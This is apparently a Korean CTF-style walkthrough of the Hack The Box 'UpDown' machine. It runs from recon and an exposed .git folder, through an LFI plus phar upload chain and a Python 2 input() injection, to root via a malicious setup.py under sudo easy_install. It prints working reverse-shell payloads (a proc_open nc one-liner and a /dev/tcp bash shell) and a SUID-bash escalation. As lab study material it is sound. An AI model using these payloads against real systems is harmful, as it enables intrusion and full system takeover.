# HTB-UPDOWN
```bash
OS:Linux
DATE: 26.09.24
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 스캔과 상세 포트 스캔, 그리고 UDP 포트까지 검사를 진행하였다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
검사 결과 22번 포트와 80번 포트만 나왔다. 따라서 초기 접근을 위해 80(http) 서비스에 접근하였다. 처음 접근하였을 때 URL을 입력할 수 있는 페이지가 있었다. 여러 가지, 즉 SSRF, LFI 등을 시도하였지만 아무런 성과가 없었다.

**FFUF**: 따라서 서브도메인과 웹 디렉토리 fuzzing을 진행하였다.
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://IP/ -H "Host: FUZZ.siteisup.htb" -fs 548
```
검사 결과 웹 디렉토리는 **/dev**라는 웹 디렉토리가 나왔고, 서브도메인 또한 dev라는 서브도메인이 있다는 것을 확인할 수 있었다. 따라서 dev.siteisup.htb 도메인을 `/etc/hosts`에 추가해준 후 접속한 결과 403 상태 코드가 떴다. 이후 웹 디렉토리 /dev에 접근한 결과 상태 코드는 200이지만 빈 페이지였다. 따라서 추가 fuzzing을 진행하였다.
```bash
ffuf -u http://IP/dev/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
fuzzing한 결과 아무런 결과가 나오지 않았다. 근데 **.** 즉 숨김 파일 검사는 실시하지 않았다는 것을 알게 되었다. 따라서 .을 붙여준 후 다시 한번 fuzzing을 진행한 결과 **.git** 페이지를 찾을 수 있었다.
```bash
ffuf -u http://IP/dev/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```

## Initial Access
/dev/.git 파일이 있다는 것을 알게 되었다. 따라서 git-dumper를 사용하여 노출된 .git 폴더의 파일들을 전부 다운로드하여 원래 소스코드로 복원해주었다.
```bash
git-dumper http://siteisup.htb/.git/ ./website
```
따라서 소스코드 복원을 성공하였다.
```bash
(root㉿kali)-[~/HTB/updown/website]
└─# ls -al                                                                                      
total 40
drwxr-xr-x 3 root root 4096 Sep 24 22:52 .
drwxr-xr-x 5 root root 4096 Sep 25 00:25 ..
-rw-r--r-- 1 root root   59 Sep 24 22:52 admin.php
-rw-r--r-- 1 root root  147 Sep 24 22:52 changelog.txt
-rw-r--r-- 1 root root 3145 Sep 24 22:52 checker.php
drwxr-xr-x 7 root root 4096 Sep 24 22:52 .git
-rw-r--r-- 1 root root  117 Sep 24 22:52 .htaccess
-rw-r--r-- 1 root root  273 Sep 24 22:52 index.php
-rw-r--r-- 1 root root 5531 Sep 24 22:52 stylesheet.css
```
따라서 소스코드도 확인해보고, 가장 중요했던 **.htaccess** 파일을 확인해 보았다. 파일 내용은 이러했다.
```bash
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
여기서 **SetEnvIf**라는 뜻은 만약 뭐라면 환경 변수를 설정하라는 뜻이다. 즉 Special-Dev 헤더의 값이 only4dev라면 allow해준다는 내용이었다. 즉 아까 dev.siteisup.htb은 그냥 접속하면 403 접근 거부 코드가 뜨지만, 허락된 헤더로 접속하면 열린다는 것이었다. 따라서 항상 그랬듯이 Burp를 사용하여 헤더를 추가해주고 forward를 진행해주니 UI나 모든 것이 이상했다. 그래서 ModHeader라는 Firefox 확장자로 편하게 헤더를 추가하여 편하게 dev.siteisup.htb을 접근할 수 있었다.
![image](attach_real/Pasted%20image%2020260925012641.png)

dev.siteisup.htb은 소스코드에 나온 그대로 업로드 기능이 있었다. 이후 소스코드를 더욱 분석하였다. 소스코드는 크게 checker.php라는 메인 페이지와 index.php 페이지가 있었다. 일단 먼저 checker.php 소스코드에서 확장자를 블랙리스트로 막는 구멍이 있었다.
```php
$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
```
이 코드의 취약점은 목록에 없는 확장자, 즉 .sean같이 .zip을 위장한 이름은 통과가 된다는 것이다. 또한 index.php 소스코드에 LFI 취약점이 있었다.
```php
include($_GET['page'] . ".php");
```
사용자가 준 page 값을 그대로 include에 넣는다. include는 파일을 불러와서 실행하는 명령이다. 즉 **?page=뭐뭐**하면 뭐뭐.php를 실행한다. 이후 이 2개의 취약점을 연결할 수 있는 것이 phar이다. phar wrapper를 사용하여 php 코드들을 zip해준 후 php 코드를 실행할 수 있었다. 따라서 바로 쉘코드를 넣고 실행하였지만 아무것도 되지 않았다. 여기서 새로운 것을 알게 된 건 phpinfo를 사용하여 정보를 먼저 확인해야 한다는 것이다. 따라서 info.php를 만들어준 후 zip을 하여 업로드해주었다.
```bash
echo "<?php phpinfo(); ?>" > info.php
```
```bash
zip zz.sean info.php
```
이후 업로드해준 후, 소스코드에서 /uploads 웹 디렉토리로 올라간 파일이 시간 기준 hex 값으로 폴더명이 저장된다는 것을 알게 되어 /uploads/11dad24260abf3c619f94b318c42797d 라는 곳에 접속할 수 있었다. 이제 아까 말한 LFI 취약점과 phar을 사용하여 php 코드를 실행할 수 있었다. `http://dev.siteisup.htb/?page=/uploads/11dad24260abf3c619f94b318c42797d/zz.sean/info.php`
![phpinfo](attach_real/Pasted%20image%2020260925015122.png)
이후 phpinfo 페이지를 확인해본 결과 system, exec 등 function들이 다 금지되어 있었다. 따라서 쉘코드가 실행되지 않았던 것이었다. 여기서 disable_functions를 우회하는 방법을 찾았다.
우회 전략은 안 막힌 함수를 찾은 후 그 함수를 사용하여 다시 쉘코드를 만든 후 쉘을 따는 것이다. 따라서 disable된 함수들 말고 다른 함수를 찾아주는 [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser)를 사용하여 주었다.
```bash
python2 dfunc-bypasser.py --url "http://dev.siteisup.htb/?page=phar://uploads/15c0ae963d95bc5ba964ba738f04bd6b/zz.sean/shell"

Traceback (most recent call last):              
  File "dfunc-bypasser.py", line 51, in <module>
    inp = phpinfo.split('disable_functions</td><td class="v">')[1].split("</")[0].split(',')[:-1]
IndexError: list index out of range 
```
하지만 계속해서 오류가 났다. 이유를 생각해보니 dev.siteisup.htb 도메인은 허용된 헤더로만 접속이 가능하다는 것을 알았다. 따라서 테스트로 curl을 던진 결과 역시나 403 코드가 떴다.
```bash
curl "http://dev.siteisup.htb/?page=phar://uploads/15c0ae963d95bc5ba964ba738f04bd6b/zz.sean/shell"
```
따라서 tool 파이썬 코드를 수정해주었다.
```python
phpinfo = requests.get(url, headers={"Special-dev":"only4dev"}).text
```
이와 같이 header를 추가해준 후 다시 작동하니 **proc_open**이라는 함수를 사용하여 쉘을 딸 수 있다는 것을 알게 되었다. 바로 proc_open reverse shell을 구글에 검색해준 후 나의 IP로 수정해주었다.
```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("file", "/tmp/error-output.txt", "a") 
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {

    fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 1337 >/tmp/f');
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```
이로써 rev.php 파일을 만든 후 다시 한번 zip을 하여 LFI로 쉘을 딸 수 있었다.
```bash
zip real.real rev.php
```
```bash
(http://dev.siteisup.htb/?page=phar://uploads/15c0ae963d95bc5ba964ba738f04bd6b/real.real/rev)

rlwrap nc -nlvp 1337
$
```
![data](attach_real/Pasted%20image%2020260925020549.png)

이로써 www-data 쉘을 얻게 된 후, developer라는 유저 디렉토리에 들어가 dev라는 폴더에 접근이 가능했다. 폴더 안에는 siteisup이라는 프로그램이 있었고 siteisup_test.py라는 스크립트가 있었다. ls -al로 확인한 결과 siteisup 프로그램이 SUID 비트로 실행된다는 것이었다. 즉 developer 유저 권한으로 실행된다는 것이었다. 이후 siteisup_test.py 스크립트를 출력해보았다.
```python 
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
라는 내용이었다. 겉보기엔 아무런 취약점이 없어 보였다. 이후 strings를 사용하여 siteisup 바이너리가 뭘 하는지 확인하였다.
```bash
strings siteisup

/usr/bin/python /home/developer/dev/siteisup_test.py
```
결론적으로 siteisup은 developer 권한으로 파이썬 스크립트를 실행한다는 것이었다. 여기서 가장 취약한 건 /usr/bin/python이다. (파이썬3이면 보통 python3인데) 이게 python2로 만들어졌다는 것이다. 그리고 print "..."와 같이 괄호 없는 print 문법은 파이썬2이기 때문이다. 대상 취약점은 input이 입력받은 걸 그대로 코드로 실행한다는 것이다. 따라서 먼저 스크립트로 확인해주었다.
```bash
python2 /home/developer/dev/siteisup_test.py

Enter URL here:__import__('os').system('id')
uid....www-data...
```
따라서 바로 siteisup 프로그램을 실행해주었다.
```bash
./siteisup

Enter URL here:__import__('os').system('id')
uid=1002(developer) gid=1002(developer) groups=1002(developer)
```
완벽하게 팩트 체크를 해주었기에 바로 리버스 쉘을 넣어주었다.
```bash
./siteisup

Enter URL here:__import__('os').system('bash -c "exec bash -i &>/dev/tcp/IP/4445 <&1"')
```
이로써 바로 developer 쉘을 획득할 수 있었다. 이후 보다 편한 접근을 위해 developer 폴더의 /.ssh를 이용하여 SSH 접근을 시도하였다. 먼저 id_rsa, id_rsa.pub 등 필요한 것이 다 있기에 id_rsa 내용을 출력한 후 내 로컬에서 파일을 따로 만든 후 권한 600을 부여하여 SSH 접근에 성공하였다.
```bash
chmod 600 id_rsa
```
```bash
ssh -i id_rsa developer@IP
```
![user](attach_real/Pasted%20image%2020260925003458.png)

## Privilege Escalation
유저 쉘에 접근하자마자 `sudo -l` 명령어를 통해 NOPASSWD로 실행되는 게 뭐가 있는지 확인해 보았다. 확인한 결과 `/usr/local/bin/easy_install`이라는 도구가 NOPASSWD로 실행되었다. easy_install이 뭔지 찾아본 결과 파이썬 패키지를 설치해주는 도구라는 걸 알게 되었다. 지금은 pip한테 밀려서 안 쓰이는 옛날 도구이다. 이것을 GTFOBins라는 권한 상승 취약점 DB에 찾아본 결과, 설치할 때 setup.py가 실행된다는 것을 알게 되었다. 따라서 권한 상승은 setup.py라는 곳에 악성 코드를 심고 진행하였다.
```bash
cd /tmp/exploit
```
```bash
echo 'import os; os.system("chmod +s /usr/bin/bash")' > setup.py
```
```bash
sudo /usr/local/bin/easy_install .
```
따라서 권한 상승을 성공하였다.
![root](attach_real/Pasted%20image%2020260925162413.png)

## New Inform
- 꼭 숨김 파일까지 fuzzing하자.
- 꼭 common.txt까지 돌려주자.
- .git 폴더: 개발자가 어떤 폴더에서 git init을 하면 그 폴더 안에 .git이라는 숨김 폴더가 생김. 이 안에 소스코드의 전체 변경 이력 등등이 들어있음. 이게 왜 취약점이 되냐면, 개발자가 웹사이트를 서버에 올릴 때 코드 폴더를 통째로 복사하는 경우가 많다. 근데 그 폴더 안에 .git 폴더도 같이 딸려 있으면 웹서버를 통해 .git 폴더가 외부에 노출됨.
- .git은 폴더 하나가 아님. .git 폴더 안에 소스코드가 통째로 들어가 있음. 하지만 인간이 읽을 수 있는 형태가 아니라 압축되고 암호처럼 변환된 형태로 저장됨. 즉 `/.git/objects/` 폴더 안에 소스코드가 압축돼서 저장됨.
- .git에서 소스코드는 어떻게 복원하냐면, .git/objects/ 안에 소스코드가 zlib으로 압축되어 해시 이름으로 저장됨. git log, git show로 커밋 이력과 소스를 복원해서 볼 수 있음.
- 꼭 항상 숨김 파일까지 확인하자.
- .htaccess: 아파치 웹서버의 설정 파일. 이걸로 할 수 있는 것들은 특정 파일/폴더 접근 차단, 특정 조건에서만 접근 허용 등등.
- Header-Based Access Control (헤더 기반 접근 제어): 특정 HTTP 헤더의 유무나 값에 따라 리소스 접근을 허용/차단하는 방식.
- Burp로 하면 웹페이지 하나를 여는 게 요청 하나가 아니기 때문에, ModHeader라는 확장자를 사용해주자.
- php 같은 확장자를 다른 이름으로 바꿨을 때는 작동을 하지 않는다. 하지만 **zip** 파일은 다른 .아무이름 으로 바꿔도 똑같이 압축 파일이기에 작동한다.
- php에서 **$_GET**은 특별한 변수. URL을 통해 들어온 값들이 자동으로 담기는 거다. 즉 ?이름=값 형태로 뭔가 붙어서 들어오면 넣어주는 것이다.
- phar://, ftp://, http:// 와 같은 것들을 래퍼라고 한다. wrapper는 어디서 어떻게 데이터를 가져올지 알려주는 접두사이다.
- phar의 결정적 차이는 실행까지 한다는 것. ftp, file, http 등은 그냥 데이터를 읽어오기만 하지만, phar은 php 파일을 읽어올 뿐 아니라 실행할 수 있다.
- phar이란 PHP Archive. PHP 코드들을 하나로 묶은 실행 가능한 꾸러미. `EX) phar://uploads/shell.zip/inside.php — 이걸 해석하면 uploads/shell.zip 압축 파일을 열어 그 안에서 inside.php를 꺼내고 php 코드로 실행`
- 항상 쉘코드를 사용하기 전에 phpinfo를 사용하는 습관을 들이자.
- phpinfo()를 실행하면 disable_functions 목록이 한 번에 보임. 일반 쉘은 system(), exec() 등을 사용.
- 바이너리 프로그램은 항상 strings로 확인해주자.
- python2는 print "..." 괄호 없는 print 문법이다.
- python2의 input()은 위험하다. 파이썬2의 input()은 사용자가 입력한 걸 그대로 파이썬 코드로 실행해버리는 취약점이 있다.
- 평범한 파이썬 코드는 두 줄로 import os 하고 쓰면 되지만, 한 줄로 써야 할 경우 **__import__('os')**는 함수라서 뒤에 뭔가 이어 붙일 수 있다.
- .ssh 폴더가 이미 있으면 id_rsa 파일 내용을 복사한 후 로컬로 옮겨준다. 이후 꼭 권한 600을 부여한 후 접속.
- easy_install: 파이썬 패키지를 설치하는 도구.
- 무조건 제작 툴이 NOPASSWD라는 강박을 버리고, 무조건 GTFO부터 확인해볼 것.